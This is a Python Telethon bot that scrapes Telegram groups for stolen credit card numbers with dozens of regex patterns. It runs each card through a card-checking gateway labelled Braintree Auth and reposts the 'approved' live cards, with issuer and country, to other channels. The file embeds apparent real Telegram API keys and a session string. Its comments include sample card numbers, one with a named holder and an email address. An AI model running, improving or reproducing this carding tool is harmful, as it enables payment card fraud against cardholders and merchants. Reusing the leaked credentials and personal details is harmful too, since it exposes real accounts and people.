import re  
import asyncio  
import logging  
from telethon import TelegramClient, events  
from telethon.sessions import StringSession  
from cc_checker import check_cc  

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# API Configuration  
api_id = 25031007  # Replace with your actual API ID
api_hash = "68029e5e2d9c4dd11f600e1692c3acaa"  # Replace with your actual API hash
session_string = "1BVtsOHkBuwteo891QQt3wAC5SA4vCJcYzdXXHES6QtyRuGGgEzsxyJdzYzD573DvrPi0Z3qqTR5AJWGOZhcKHAV56VZ8MEYw-BADl48k_kCFOZusv2stf1hJPRZQ8G8fxLiWxwnWz_WjgHSLvYxtMmqrUUqXusu1xcZO6BmRoHVMth3xXfdqvXtbEgP6DIQ0fIVLQdFxj3EcE-Q8cuHTb6peDQ9QkV04DME8U51YeEw0AH5156nifS6sKvQLkLmncxyC3jkrY90tKCmyOyieXvDO9UAW-nLOSEg_RbJF0wqduCuzNpl1_kJ8azZlHt2pfpKj140t1VMHE0-HIPxl8Dnc0U1lACQ="  # Replace with your actual Telethon session string

# Sources Configuration - add as many as needed
source_groups = [-1002410570317]  # Add source group IDs if needed
source_channels = []  # Add source channel IDs if needed

# Target channels where scraped CCs will be sent (you can add multiple IDs)
target_channels = [-1002319403142]  # Add more channel IDs as needed

# Initialize client with session string
client = TelegramClient(StringSession(session_string), api_id, api_hash)  

# Lock to ensure only one check at a time
check_lock = asyncio.Lock()

# Enhanced CC patterns to capture more formats
cc_patterns = [
    # New Format 1: 𝗖𝗖 ➼ 5424322335125154|07|27|363
    r'(?:𝗖𝗖|CC)\s*➼\s*(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
    
    r'[•\*\-]\s*CC\s+(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',

    # Format 2 & 9 & 10: 5262190163068118|01|2029|923 or 4432290821938088|07|28|183 or 5517760000228621|08|27|747
    r'(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',

    # Format 3: 5563800132516965\n03/27\n196
    r'(\d{13,16})\n(\d{2})/(\d{2,4})\n(\d{3,4})',

    # Format 4 & 11: 4628880202243142 10/27 501 or 5168404154402888 03/26 416
    r'(\d{13,16})\s(\d{2})/(\d{2,4})\s(\d{3,4})',

    # Format 5: CCNUM: 4622630013568831 CVV: 577 EXP: 12/2027
    r'CCNUM:?\s*(\d{13,16})\s*CVV:?\s*(\d{3,4})\s*EXP:?\s*(\d{1,2})/(\d{2,4})',

    # Format 6: NR: 4130220014499932 Holder: Merre Friend CVV: 703 EXPIRE: 03/28
    r'NR:?\s*(\d{13,16})\s*(?:Holder:.*?\s*)?CVV:?\s*(\d{3,4})\s*EXPIRE:?\s*(\d{1,2})/(\d{2,4})',

    # Format 7: Card: 5289460011885479 Exp. month: 9 Exp. year: 25 CVV: 350
    r'Card:?\s*(\d{13,16})\s*Exp\. month:?\s*(\d{1,2})\s*Exp\. year:?\s*(\d{2,4})\s*CVV:?\s*(\d{3,4})',

    # Format 8: 4019240106255832|03/26|987|小関美華|Doan|コセキ ミカ|k.mika.0801@icloud.com|0
    r'(\d{13,16})\|(\d{2})/(\d{2,4})\|(\d{3,4})(?:\|.*)?',

    # New Format 2: ╔ ● CC: 4491042736323072|12|2030|105
    r'[╔]\s*[●]\s*CC:?\s*(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',

    # Format 1: • CC  5418792156740992|04|2027|267
    r'[•\*\-]\s*CC\s+(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',

    # Format 2 & 9 & 10: 5262190163068118|01|2029|923 or 4432290821938088|07|28|183 or 5517760000228621|08|27|747
    r'(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',

    # Format 3: 5563800132516965\n03/27\n196
    r'(\d{13,16})\n(\d{2})/(\d{2,4})\n(\d{3,4})',

    # Format 4 & 11: 4628880202243142 10/27 501 or 5168404154402888 03/26 416
    r'(\d{13,16})\s(\d{2})/(\d{2,4})\s(\d{3,4})',

    # Format 5: CCNUM: 4622630013568831 CVV: 577 EXP: 12/2027
    r'CCNUM:?\s*(\d{13,16})\s*CVV:?\s*(\d{3,4})\s*EXP:?\s*(\d{1,2})/(\d{2,4})',

    # Format 6: NR: 4130220014499932 Holder: Merre Friend CVV: 703 EXPIRE: 03/28
    r'NR:?\s*(\d{13,16})\s*(?:Holder:.*?\s*)?CVV:?\s*(\d{3,4})\s*EXPIRE:?\s*(\d{1,2})/(\d{2,4})',

    # Format 7: Card: 5289460011885479 Exp. month: 9 Exp. year: 25 CVV: 350
    r'Card:?\s*(\d{13,16})\s*Exp\. month:?\s*(\d{1,2})\s*Exp\. year:?\s*(\d{2,4})\s*CVV:?\s*(\d{3,4})',

    # Format 8: 4019240106255832|03/26|987|小関美華|Doan|コセキ ミカ|k.mika.0801@icloud.com|0
    r'(\d{13,16})\|(\d{2})/(\d{2,4})\|(\d{3,4})(?:\|.*)?',
    r'(\d{13,16})[\s|/|\-|~]?\s*(\d{1,2})[\s|/|\-|~]?\s*(\d{2,4})[\s|/|\-|~]?\s*(\d{3,4})',
    r'(\d{13,16})\s(\d{1,2})\s(\d{2,4})\s(\d{3,4})',
    r'(\d{13,16})\n(\d{1,2})\n(\d{2,4})\n(\d{3,4})',
    r'(\d{13,16})\n(\d{1,2})[/|-](\d{2,4})\n(\d{3,4})',
    r'(\d{13,16})[:|=|>]?(\d{1,2})[:|=|>]?(\d{2,4})[:|=|>]?(\d{3,4})',
    r'(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
    r'cc(?:num)?:[\s]?(\d{13,16})[\s\n]+(?:exp|expiry|expiration):[\s]?(\d{1,2})[/|-](\d{2,4})[\s\n]+(?:cvv|cvc|cv2):[\s]?(\d{3,4})',
    r'(?:cc|card)(?:num)?[\s:]+(\d{13,16})[\s\n]+(?:exp|expiry|expiration)[\s:]+(\d{1,2})[/|-](\d{2,4})[\s\n]+(?:cvv|cvc|cv2)[\s:]+(\d{3,4})',
    r'(\d{13,16})(?:\s*(?:card|exp|expiry|expiration)\s*(?:date)?\s*[:|=|-|>])?\s*(\d{1,2})(?:\s*[/|-])?\s*(\d{2,4})(?:\s*(?:cvv|cvc|cv2)\s*[:|=|-|>])?\s*(\d{3,4})',
    r'(?:.*?:)?\s*(\d{13,16})\s*(?:\n|\r\n|\r)(?:.*?)?(\d{1,2})[/|-](\d{2}|20\d{2})(?:\n|\r\n|\r)(\d{3,4})(?:.*)',
    r'(?:.*?:)?\s*(\d{13,16})\|(\d{1,2})\|(\d{2})\|(\d{3,4})(?:\|.*)?',
    r'(?:.*?)NR:?\s*(\d{13,16})(?:.*?)EXPIRE:?\s*(\d{1,2})[/|-](\d{2}|20\d{2})(?:.*?)CVV:?\s*(\d{3,4})(?:.*)',
    r'(?:.*?)CVV:?\s*(\d{3,4})(?:.*?)EXPIRE:?\s*(\d{1,2})[/|-](\d{2}|20\d{2})(?:.*?)NR:?\s*(\d{13,16})(?:.*)',
    r'(?:.*?)(\d{13,16})(?:.*?)(\d{1,2})[/|-](\d{2}|20\d{2})(?:.*?)(\d{3,4})(?:.*)',
]

# Format CC to desired format
def format_cc(match):  
    groups = match.groups()
    
    if len(groups) == 4:
        if len(groups[2]) >= 3 and len(groups[2]) <= 4 and len(groups[3]) == 2:
            cc, cvv, mm, yy = groups
        else:
            cc, mm, yy, cvv = groups
    else:
        return None
    
    cc = cc.strip()
    mm = mm.strip().zfill(2)  
    yy = yy.strip()
    if len(yy) == 4:
        yy = yy[-2:]
    cvv = cvv.strip()
    
    if not (13 <= len(cc) <= 19) or not (3 <= len(cvv) <= 4):
        return None
        
    return f"{cc}|{mm}|{yy}|{cvv}"

# Define sources handler
def get_sources():
    sources = []
    if source_groups:
        sources.extend(source_groups)
    if source_channels:
        sources.extend(source_channels)
    return sources

# Scraper Event Handler
@client.on(events.NewMessage(chats=get_sources() if get_sources() else None))  
async def cc_scraper(event):  
    text = event.raw_text  
    found_ccs = set()  
  
    for pattern in cc_patterns:  
        for match in re.finditer(pattern, text):  
            formatted_cc = format_cc(match)
            if formatted_cc:  
                found_ccs.add(formatted_cc)
  
    if found_ccs:  
        for cc in found_ccs:  
            async with check_lock:  # Ensure only one check at a time
                logging.info(f"Checking credit card: {cc}")
                # Check the credit card validity
                result = await check_cc(cc)
                if result['status'] == 'approved':
                    logging.info(f"Credit card approved: {cc}")
                    # Format the message as in b3.py
                    card_info = f"{result['card_type']} - {result['card_level']} - {result['card_type_category']}"
                    issuer = result['issuer']
                    country_display = f"{result['country_name']} {result['country_flag']}" if result['country_flag'] else result['country_name']
                    message = (f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n\n"
                               f"[ϟ]𝗖𝗮𝗿𝗱 -» <code>{result['card']}</code>\n"
                               f"[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Braintree Auth\n"
                               f"[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» Approved ✅\n\n"
                               f"[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}\n"
                               f"[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛\n"
                               f"[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country_display}\n\n"
                               f"[⌬]𝗧𝗶𝗺𝗲 -» {result['time_taken']:.2f} seconds\n"
                               f"[⌬]𝗣𝗿𝗼𝘅𝘆 -» {result['proxy_status']}\n"
                               f"[み]𝗕𝗼𝘁 -» <a href='tg://user?id=8009942983'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>")
                    
                    # Send the message to all target channels
                    if target_channels:
                        for channel_id in target_channels:
                            try:
                                await client.send_message(channel_id, message, parse_mode="HTML")
                                logging.info(f"Message sent to channel {channel_id}")
                            except Exception as e:
                                logging.error(f"Error sending to channel {channel_id}: {str(e)}")
                    else:
                        logging.info(f"Approved CC: {cc}")
                else:
                    logging.info(f"Credit card declined: {cc}")
                
                # Wait 10 seconds before the next check
                logging.info("Waiting 10 seconds before next check...")
                await asyncio.sleep(10)
            logging.info("Lock released, proceeding to next check if any.")

# Run Client  
async def main():  
    await client.start()  
    logging.info("✅ CC Scraper Running...")
    
    sources = get_sources()
    if sources:
        logging.info(f"✅ Monitoring {len(sources)} source(s)")
    else:
        logging.info("⚠️ No sources specified. Will monitor all chats the account has access to.")
    
    if target_channels:
        logging.info(f"✅ Found CCs will be sent to {len(target_channels)} channel(s)")
    else:
        logging.info("⚠️ No target channels specified. Found CCs will be printed to console only.")
        
    await client.run_until_disconnected()  

if __name__ == "__main__":  
    asyncio.run(main())
